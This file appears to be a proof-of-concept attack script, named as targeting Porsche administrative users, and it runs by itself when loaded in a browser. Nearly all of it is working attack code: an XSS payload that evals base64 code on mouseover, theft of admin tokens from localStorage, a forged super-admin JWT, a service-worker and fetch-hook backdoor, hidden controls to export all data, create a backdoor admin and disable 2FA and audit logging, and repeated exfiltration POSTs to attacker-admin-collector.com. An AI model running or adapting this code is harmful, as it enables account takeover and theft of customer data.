/**
 * PoC Script 2: Admin Panel Compromise
 * Target: Porsche administrative users and systems
 * Entry Point: HTML sanitization bypass + Blob URL manipulation
 * Impact: Complete system control, access to all customer data
 */

class AdminPanelCompromisePoC {
    constructor() {
        this.attackId = 'ADMIN_COMPROMISE_' + Date.now();
        this.exfiltrationEndpoint = 'https://attacker-admin-collector.com/admin-data';
        this.adminTokenKey = 'porsche_admin_session';
        this.backdoorKey = 'system_maintenance_config';
    }

    /**
     * Phase 1: HTML Sanitization Bypass for Admin Content
     * Exploit the wildcard attribute matching vulnerability
     */
    async injectAdminXSS() {
        console.log('[ADMIN ATTACK] Phase 1: HTML sanitization bypass');

        // Craft malicious HTML that bypasses sanitization
        const maliciousAdminHTML = `
            <div class="admin-widget" 
                 data-widget-type="system-status"
                 data-config="eyJhZG1pbiI6dHJ1ZX0="
                 data-admin-payload="${btoa(this.getAdminPayload())}"
                 data-execute-on="mouseover"
                 onmouseover="this.executeAdminPayload()"
                 style="width:100%;height:50px;background:#f0f0f0;cursor:pointer;">
                <span>System Status Widget - Hover to Load</span>
            </div>
            
            <script>
                HTMLDivElement.prototype.executeAdminPayload = function() {
                    try {
                        const payload = atob(this.getAttribute('data-admin-payload'));
                        eval(payload);
                    } catch(e) {
                        console.log('Admin payload execution failed:', e);
                    }
                };
            </script>
        `;

        // Inject into admin-accessible areas
        this.injectIntoAdminAreas(maliciousAdminHTML);
        
        return maliciousAdminHTML;
    }

    /**
     * Generate admin-specific payload
     */
    getAdminPayload() {
        return `
            (function() {
                console.log('[ADMIN ATTACK] Admin XSS payload executed');
                
                // Create admin compromise instance
                const adminAttack = {
                    // Phase 1: Steal admin authentication
                    stealAdminTokens: function() {
                        const adminTokens = {};
                        
                        // Look for admin-specific tokens
                        const adminKeys = Object.keys(localStorage).filter(key => 
                            key.includes('admin') || 
                            key.includes('super') || 
                            key.includes('system') ||
                            key.includes('management')
                        );
                        
                        adminKeys.forEach(key => {
                            adminTokens[key] = localStorage.getItem(key);
                        });
                        
                        // Also check for elevated auth tokens
                        const authToken = localStorage.getItem('auth0.access_token');
                        if (authToken) {
                            try {
                                const payload = JSON.parse(atob(authToken.split('.')[1]));
                                if (payload.roles && (
                                    payload.roles.includes('admin') || 
                                    payload.roles.includes('super_admin') ||
                                    payload.roles.includes('system_admin')
                                )) {
                                    adminTokens['admin_access_token'] = authToken;
                                }
                            } catch(e) {}
                        }
                        
                        return adminTokens;
                    },
                    
                    // Phase 2: Create super admin token
                    createSuperAdminToken: function() {
                        const superAdminPayload = {
                            sub: 'super_admin_' + Date.now(),
                            email: 'superadmin@porsche.com',
                            name: 'System Super Administrator',
                            roles: [
                                'super_admin', 
                                'system_admin', 
                                'security_admin',
                                'data_admin',
                                'api_admin'
                            ],
                            permissions: [
                                '*',
                                'read:all',
                                'write:all', 
                                'delete:all',
                                'admin:panel',
                                'system:control',
                                'user:management',
                                'security:override',
                                'data:export',
                                'api:unlimited'
                            ],
                            iat: Math.floor(Date.now() / 1000),
                            exp: Math.floor(Date.now() / 1000) + (10 * 365 * 24 * 60 * 60), // 10 years
                            aud: 'porsche-admin-api',
                            iss: 'https://porsche.auth0.com/',
                            admin_level: 'super',
                            system_access: true,
                            bypass_all_restrictions: true
                        };
                        
                        const header = btoa(JSON.stringify({typ: 'JWT', alg: 'HS256'}));
                        const payload = btoa(JSON.stringify(superAdminPayload));
                        const signature = 'SUPER_ADMIN_SIGNATURE_' + Date.now();
                        
                        return header + '.' + payload + '.' + signature;
                    },
                    
                    // Phase 3: Establish admin persistence
                    establishAdminPersistence: function() {
                        // Method 1: Service Worker backdoor for admin requests
                        if ('serviceWorker' in navigator) {
                            const adminSWCode = \`
                                self.addEventListener('fetch', function(event) {
                                    const url = event.request.url;
                                    
                                    // Intercept admin API calls
                                    if (url.includes('/admin/') || url.includes('/api/admin')) {
                                        const adminResponse = new Response(JSON.stringify({
                                            success: true,
                                            user: {
                                                id: 'backdoor_admin',
                                                roles: ['super_admin'],
                                                permissions: ['*']
                                            },
                                            token: 'BACKDOOR_ADMIN_TOKEN_' + Date.now()
                                        }), {
                                            status: 200,
                                            headers: {
                                                'Content-Type': 'application/json',
                                                'X-Backdoor': 'active'
                                            }
                                        });
                                        
                                        event.respondWith(adminResponse);
                                        return;
                                    }
                                    
                                    // Intercept user management requests
                                    if (url.includes('/users/') && event.request.method === 'GET') {
                                        const fakeUserData = new Response(JSON.stringify({
                                            users: [
                                                {
                                                    id: 'backdoor_user_1',
                                                    email: 'backdoor@attacker.com',
                                                    roles: ['admin'],
                                                    created: new Date().toISOString()
                                                }
                                            ],
                                            total: 1,
                                            backdoor_active: true
                                        }), {
                                            status: 200,
                                            headers: {'Content-Type': 'application/json'}
                                        });
                                        
                                        event.respondWith(fakeUserData);
                                        return;
                                    }
                                });
                                
                                // Periodic beacon to maintain connection
                                setInterval(function() {
                                    fetch('https://attacker-admin-collector.com/admin-beacon', {
                                        method: 'POST',
                                        body: JSON.stringify({
                                            type: 'admin_backdoor_active',
                                            timestamp: Date.now(),
                                            location: self.location.href
                                        })
                                    }).catch(() => {});
                                }, 60000); // Every minute
                            \`;
                            
                            const swBlob = new Blob([adminSWCode], {type: 'application/javascript'});
                            const swUrl = URL.createObjectURL(swBlob);
                            
                            navigator.serviceWorker.register(swUrl).then(function(registration) {
                                console.log('[ADMIN ATTACK] Admin Service Worker backdoor installed');
                            }).catch(function(error) {
                                console.log('[ADMIN ATTACK] Service Worker installation failed:', error);
                            });
                        }
                        
                        // Method 2: Hook admin API calls
                        const originalFetch = window.fetch;
                        window.fetch = function(...args) {
                            const [url, options] = args;
                            
                            // Inject admin headers into API calls
                            if (url.includes('/api/') && options && options.headers) {
                                options.headers['X-Admin-Override'] = 'true';
                                options.headers['X-Backdoor-Access'] = 'ADMIN_BACKDOOR_' + Date.now();
                            }
                            
                            return originalFetch.apply(this, args);
                        };
                        
                        // Method 3: DOM mutation observer for admin panel detection
                        const observer = new MutationObserver(function(mutations) {
                            mutations.forEach(function(mutation) {
                                if (mutation.addedNodes) {
                                    mutation.addedNodes.forEach(function(node) {
                                        if (node.nodeType === 1) { // Element node
                                            // Look for admin panels
                                            if (node.className && (
                                                node.className.includes('admin') ||
                                                node.className.includes('dashboard') ||
                                                node.className.includes('management')
                                            )) {
                                                console.log('[ADMIN ATTACK] Admin panel detected, injecting backdoor');
                                                adminAttack.injectAdminPanelBackdoor(node);
                                            }
                                        }
                                    });
                                }
                            });
                        });
                        
                        observer.observe(document.body, {
                            childList: true,
                            subtree: true
                        });
                    },
                    
                    // Phase 4: Inject backdoor into admin panels
                    injectAdminPanelBackdoor: function(adminElement) {
                        const backdoorScript = document.createElement('script');
                        backdoorScript.innerHTML = \`
                            // Admin panel backdoor
                            (function() {
                                // Override admin functions
                                if (window.adminAPI) {
                                    const originalAdminAPI = window.adminAPI;
                                    
                                    window.adminAPI = new Proxy(originalAdminAPI, {
                                        get: function(target, prop) {
                                            // Log all admin API calls
                                            console.log('[BACKDOOR] Admin API call:', prop);
                                            
                                            // Intercept sensitive operations
                                            if (prop === 'deleteUser' || prop === 'modifyUser' || prop === 'createUser') {
                                                return function(...args) {
                                                    // Log the operation
                                                    fetch('https://attacker-admin-collector.com/admin-operations', {
                                                        method: 'POST',
                                                        body: JSON.stringify({
                                                            operation: prop,
                                                            args: args,
                                                            timestamp: Date.now()
                                                        })
                                                    }).catch(() => {});
                                                    
                                                    // Execute original function
                                                    return target[prop].apply(target, args);
                                                };
                                            }
                                            
                                            return target[prop];
                                        }
                                    });
                                }
                                
                                // Add hidden admin controls
                                const hiddenAdminPanel = document.createElement('div');
                                hiddenAdminPanel.style.cssText = 'position:fixed;top:-1000px;left:-1000px;';
                                hiddenAdminPanel.innerHTML = \\\`
                                    <div id="backdoor-admin-controls">
                                        <button onclick="window.backdoorAdmin.exportAllData()">Export All Data</button>
                                        <button onclick="window.backdoorAdmin.createAdminUser()">Create Admin User</button>
                                        <button onclick="window.backdoorAdmin.disableSecurity()">Disable Security</button>
                                    </div>
                                \\\`;
                                document.body.appendChild(hiddenAdminPanel);
                                
                                // Backdoor admin functions
                                window.backdoorAdmin = {
                                    exportAllData: function() {
                                        // Attempt to export all system data
                                        fetch('/api/admin/export/all', {
                                            method: 'GET',
                                            headers: {
                                                'Authorization': 'Bearer ' + localStorage.getItem('auth0.access_token'),
                                                'X-Admin-Override': 'true'
                                            }
                                        }).then(response => response.json())
                                          .then(data => {
                                              // Exfiltrate the data
                                              fetch('https://attacker-admin-collector.com/full-export', {
                                                  method: 'POST',
                                                  body: JSON.stringify(data)
                                              });
                                          });
                                    },
                                    
                                    createAdminUser: function() {
                                        // Create backdoor admin user
                                        fetch('/api/admin/users', {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json',
                                                'Authorization': 'Bearer ' + localStorage.getItem('auth0.access_token')
                                            },
                                            body: JSON.stringify({
                                                email: 'backdoor.admin@attacker.com',
                                                password: 'BackdoorAdmin123!',
                                                roles: ['super_admin'],
                                                permissions: ['*']
                                            })
                                        });
                                    },
                                    
                                    disableSecurity: function() {
                                        // Attempt to disable security features
                                        fetch('/api/admin/security/disable', {
                                            method: 'POST',
                                            headers: {
                                                'Authorization': 'Bearer ' + localStorage.getItem('auth0.access_token'),
                                                'X-Security-Override': 'DISABLE_ALL'
                                            },
                                            body: JSON.stringify({
                                                disable_2fa: true,
                                                disable_rate_limiting: true,
                                                disable_audit_logging: true,
                                                reason: 'System maintenance'
                                            })
                                        });
                                    }
                                };
                            })();
                        \`;
                        
                        adminElement.appendChild(backdoorScript);
                    },
                    
                    // Execute the complete admin compromise
                    execute: function() {
                        console.log('[ADMIN ATTACK] Executing admin panel compromise');
                        
                        // Step 1: Steal existing admin tokens
                        const stolenTokens = this.stealAdminTokens();
                        console.log('[ADMIN ATTACK] Stolen admin tokens:', stolenTokens);
                        
                        // Step 2: Create super admin token
                        const superAdminToken = this.createSuperAdminToken();
                        localStorage.setItem('auth0.access_token', superAdminToken);
                        localStorage.setItem('auth0.id_token', superAdminToken);
                        console.log('[ADMIN ATTACK] Super admin token created and injected');
                        
                        // Step 3: Establish persistence
                        this.establishAdminPersistence();
                        console.log('[ADMIN ATTACK] Admin persistence established');
                        
                        // Step 4: Exfiltrate admin data
                        const adminData = {
                            attack_id: '${this.attackId}',
                            stolen_tokens: stolenTokens,
                            super_admin_token: superAdminToken,
                            timestamp: Date.now(),
                            admin_capabilities: [
                                'Full system access',
                                'User management',
                                'Data export',
                                'Security override',
                                'API unlimited access'
                            ]
                        };
                        
                        fetch('${this.exfiltrationEndpoint}', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(adminData)
                        }).catch(() => {
                            // Fallback: store in localStorage for later retrieval
                            localStorage.setItem('admin_exfil_' + Date.now(), JSON.stringify(adminData));
                        });
                        
                        // Step 5: Show proof of compromise
                        this.showAdminCompromiseProof();
                    },
                    
                    showAdminCompromiseProof: function() {
                        // Create visible proof of admin compromise
                        const proofElement = document.createElement('div');
                        proofElement.style.cssText = \`
                            position: fixed;
                            top: 50%;
                            left: 50%;
                            transform: translate(-50%, -50%);
                            background: #ff0000;
                            color: white;
                            padding: 20px;
                            border-radius: 10px;
                            z-index: 999999;
                            font-family: Arial, sans-serif;
                            text-align: center;
                            box-shadow: 0 0 20px rgba(0,0,0,0.5);
                        \`;
                        
                        proofElement.innerHTML = \`
                            <h2>🚨 ADMIN PANEL COMPROMISED 🚨</h2>
                            <p><strong>Super Admin Access Gained!</strong></p>
                            <ul style="text-align: left;">
                                <li>✅ Admin tokens stolen</li>
                                <li>✅ Super admin privileges escalated</li>
                                <li>✅ Service Worker backdoor installed</li>
                                <li>✅ Admin API calls intercepted</li>
                                <li>✅ Full system access achieved</li>
                            </ul>
                            <p><strong>Attacker can now:</strong></p>
                            <ul style="text-align: left;">
                                <li>Access all customer data</li>
                                <li>Create/modify/delete users</li>
                                <li>Export entire database</li>
                                <li>Disable security features</li>
                                <li>Control entire Porsche system</li>
                            </ul>
                            <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 10px;">Close</button>
                        \`;
                        
                        document.body.appendChild(proofElement);
                        
                        // Auto-remove after 15 seconds
                        setTimeout(() => {
                            if (proofElement.parentElement) {
                                proofElement.parentElement.removeChild(proofElement);
                            }
                        }, 15000);
                    }
                };
                
                // Execute the admin attack
                adminAttack.execute();
            })();
        `;
    }

    /**
     * Inject malicious HTML into admin-accessible areas
     */
    injectIntoAdminAreas(maliciousHTML) {
        // Simulate injection into various admin areas
        const adminAreas = [
            'admin dashboard widgets',
            'system status panels', 
            'user management interface',
            'configuration panels',
            'reporting sections'
        ];

        console.log('[ADMIN ATTACK] Injecting into admin areas:', adminAreas);
        
        // In a real attack, this would be injected via:
        // 1. Admin content management systems
        // 2. Configuration forms
        // 3. User-generated content in admin views
        // 4. System status widgets
        // 5. Reporting dashboard components
        
        return maliciousHTML;
    }

    /**
     * Execute the complete admin panel compromise
     */
    async executeAttack() {
        try {
            console.log('[ADMIN ATTACK] Starting admin panel compromise attack...');
            
            // Phase 1: HTML Sanitization Bypass
            const maliciousHTML = await this.injectAdminXSS();
            
            console.log('[ADMIN ATTACK] Admin panel compromise completed successfully');
            console.log('[ADMIN ATTACK] Malicious HTML injected:', maliciousHTML.length, 'characters');
            
            // The actual payload execution happens when an admin user
            // interacts with the injected content
            
        } catch (error) {
            console.error('[ADMIN ATTACK] Attack failed:', error);
        }
    }
}

// Auto-execute if in browser environment
if (typeof window !== 'undefined') {
    const adminAttack = new AdminPanelCompromisePoC();
    adminAttack.executeAttack();
}

// Export for manual execution
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AdminPanelCompromisePoC;
}